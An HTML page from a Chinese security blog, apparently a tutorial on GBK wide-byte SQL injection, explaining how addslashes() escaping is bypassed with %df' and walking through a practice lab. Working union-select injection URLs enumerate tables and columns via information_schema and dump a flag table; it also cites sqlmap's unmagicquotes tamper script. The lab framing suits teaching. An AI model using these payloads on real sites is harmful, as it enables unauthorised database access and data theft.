@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.15.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="SQL注入-宽字节注入 注入基础GBK 编码 两个字节表示一个字符 ASCII 编码 一个字节表示一个字符 MYSQL默认字节集是GBK等宽字节字符集 addslashes()函数1234567addslashes ( string &#96;$str&#96; ) : string返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（&#96;&amp;#x27;&#96;）、双引号（&#96;&quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入-宽字节注入">
+<meta property="og:url" content="http://example.com/2022/11/11/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="kilig&#39;s Blog">
+<meta property="og:description" content="SQL注入-宽字节注入 注入基础GBK 编码 两个字节表示一个字符 ASCII 编码 一个字节表示一个字符 MYSQL默认字节集是GBK等宽字节字符集 addslashes()函数1234567addslashes ( string &#96;$str&#96; ) : string返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（&#96;&amp;#x27;&#96;）、双引号（&#96;&quot;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410123856157.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410124011684.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410124145409.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410124429623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ%3Cmark%3E,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410124608697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ%3C/mark%3E,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410124718976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410124738583.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410124939915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410125041699.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410140314506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410140621232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410141019719.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410141359608.png">
+<meta property="article:published_time" content="2022-11-11T11:39:41.000Z">
+<meta property="article:modified_time" content="2023-03-07T13:29:10.595Z">
+<meta property="article:author" content="kiligwh">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210410123856157.png">
+
+
+<link rel="canonical" href="http://example.com/2022/11/11/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2022/11/11/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/","path":"2022/11/11/SQL注入-宽字节注入/","title":"SQL注入-宽字节注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL注入-宽字节注入 | kilig's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">kilig's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">If it is a rose,it will blossom</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">SQL注入-宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80"><span class="nav-number">1.1.</span> <span class="nav-text">注入基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#addslashes-%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.</span> <span class="nav-text">addslashes()函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">1.3.</span> <span class="nav-text">利用场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#URL%E7%BC%96%E7%A0%81"><span class="nav-number">1.4.</span> <span class="nav-text">URL编码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA"><span class="nav-number">1.5.</span> <span class="nav-text">靶场</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQLMap%E8%B7%91%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">SQLMap跑宽字节注入</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kiligwh"
+      src="/images/kilig.gif">
+  <p class="site-author-name" itemprop="name">kiligwh</p>
+  <div class="site-description" itemprop="description">欢迎</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/11/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kilig.gif">
+      <meta itemprop="name" content="kiligwh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kilig's Blog">
+      <meta itemprop="description" content="欢迎">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQL注入-宽字节注入 | kilig's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入-宽字节注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-11-11 19:39:41" itemprop="dateCreated datePublished" datetime="2022-11-11T19:39:41+08:00">2022-11-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-07 21:29:10" itemprop="dateModified" datetime="2023-03-07T21:29:10+08:00">2023-03-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="SQL注入-宽字节注入"><a href="#SQL注入-宽字节注入" class="headerlink" title="SQL注入-宽字节注入"></a>SQL注入-宽字节注入</h1><hr>
+<h2 id="注入基础"><a href="#注入基础" class="headerlink" title="注入基础"></a>注入基础</h2><p>GBK 编码 两个字节表示一个字符</p>
+<p>ASCII 编码 一个字节表示一个字符</p>
+<p>MYSQL默认字节集是GBK等宽字节字符集</p>
+<h2 id="addslashes-函数"><a href="#addslashes-函数" class="headerlink" title="addslashes()函数"></a>addslashes()函数</h2><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">addslashes <span class="punctuation">(</span> string `$str` <span class="punctuation">)</span> <span class="operator">:</span> string</span><br><span class="line"></span><br><span class="line">返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。</span><br><span class="line">这些字符是单引号（`&#x27;`）、双引号（`&quot;`）、反斜线（`\`）与 NUL（**`null`** 字符）。</span><br><span class="line"></span><br><span class="line">只要注入&#x27;  &quot;  \ 空字符 都会转义为 \&#x27;  \&quot; \\ \   </span><br><span class="line">魔术单引号同理【PHP5.4及其以上魔术引号是被删除了】</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>如果网站使用了 addslashes()函数函数或者开启了魔术单引号，恰巧MYSQL数据库为GBK，就会造成宽字节注入</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">%DF</span>&#x27;:    </span><br><span class="line"></span><br><span class="line">- 会被PHP当中的addslashes函数转义为：<span class="variable">%DF</span>\&#x27;   </span><br><span class="line">- \ 会被URL编码为 <span class="variable">%5</span>C</span><br><span class="line">- 那么 <span class="variable">%DF</span>&#x27;  会被转义为 <span class="variable">%DF</span><span class="variable">%5</span>C<span class="variable">%27</span></span><br><span class="line">- <span class="variable">%DF</span><span class="variable">%5</span>C<span class="variable">%27</span>是一个宽字节 也就是一个縗&#x27;</span><br><span class="line">从而可以进行构造闭合，进行注入</span><br><span class="line">小技巧：有的时候我们也可以用<span class="number">16</span>进制来代替字符串</span><br></pre></td></tr></table></figure>
+
+<h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>%27———单引号</p>
+<p>%20———-空格</p>
+<p>%23———–#号</p>
+<p>%5c————\反斜杠</p>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210410123856157.png" alt="在这里插入图片描述"></p>
+<p>2、使用反斜杠进行探测<br>明明只输入了一个反斜杠，在查询语句中却出现了两个<br><img src="https://img-blog.csdnimg.cn/20210410124011684.png" alt="在这里插入图片描述"></p>
+<p>输入一个单引号却出现反斜杠+单引号<br><img src="https://img-blog.csdnimg.cn/20210410124145409.png" alt="在这里插入图片描述"></p>
+<p>3、有此可以判断，使用了转义函数addslashes()或者魔术引号，试一试可否进行宽字节注入<br>输入%df’，页面报错，好事情<br><img src="https://img-blog.csdnimg.cn/20210410124429623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ%3Cmark%3E,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4、在’后加上注释符– q<br>页面返回正常，存在宽字节注入<br><img src="https://img-blog.csdnimg.cn/20210410124608697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ%3C/mark%3E,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5、使用order by 判断字段数<br><img src="https://img-blog.csdnimg.cn/20210410124718976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410124738583.png" alt="在这里插入图片描述"><br>可知字段数为3</p>
+<p>6、使用联合查询，探测回显点<br>得到回显点2,3<br><img src="https://img-blog.csdnimg.cn/20210410124939915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>7、使用version()，查询数据库版本号<br><img src="https://img-blog.csdnimg.cn/20210410125041699.png" alt="在这里插入图片描述"><br>5.0以上版本，可以使用information_schema数据库得出数据</p>
+<p>8、使用limit依次爆出表名</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php?id=0%df&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,table_name <span class="keyword">from</span> </span><br><span class="line">information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>-- q</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210410140314506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>9、查看china_flag表下的字段名<br>使用联合查询时</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?<span class="attribute">id</span>=0%df&#x27; union select 1,2,group_concat(column_name) <span class="keyword">from</span> information_schema.columns</span><br><span class="line"> where <span class="attribute">table_schema</span>=database() <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">&#x27;china_flag&#x27;</span>-- q</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210410140621232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>此时可采用子查询的方式</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=0%df&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> </span><br><span class="line">table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=</span><br><span class="line"> (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"> -- q</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210410141019719.png" alt="在这里插入图片描述"><br>得到china_flag表下的Id和C_Flag字段</p>
+<p>10、使用limit依次爆出Id和C_Flag字段信息</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">index</span>.php?id=<span class="number">0</span>%df&#x27; union select <span class="number">1</span>,Id,C_Flag from china_flag limit <span class="number">0</span>,<span class="number">1</span>-- q</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210410141359608.png" alt="在这里插入图片描述"></p>
+<h1 id="SQLMap跑宽字节注入"><a href="#SQLMap跑宽字节注入" class="headerlink" title="SQLMap跑宽字节注入"></a>SQLMap跑宽字节注入</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在已知存在宽字节注入的情况下，可使用sqlmap的参数：</span><br><span class="line"> <span class="comment">--tamper  unmagicquotes.py</span></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/11/11/SQL%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" rel="prev" title="SQL注入-时间盲注">
+                  <i class="fa fa-chevron-left"></i> SQL注入-时间盲注
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/11/12/SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" rel="next" title="SQL注入-二次注入">
+                  SQL注入-二次注入 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kiligwh</span>
+</div>
+
+<!-- 删除 “由 Hexo & NexT.Gemini 强力驱动” -->
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div> -->
+
+<!-- <br /> -->
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<!-- <span id="times">载入时分秒...</span> -->
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("11/17/2022 8:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); 
+        if(String(snum).length ==1 ){snum = "0" + snum;}
+        // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "+hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+    </div>
+  </footer>
+
+  
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+  
+  
+  <script type="text/javascript"
+	count="150"
+	opacity: 1
+	src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+  </script>
+  
+
+</body>
+</html>
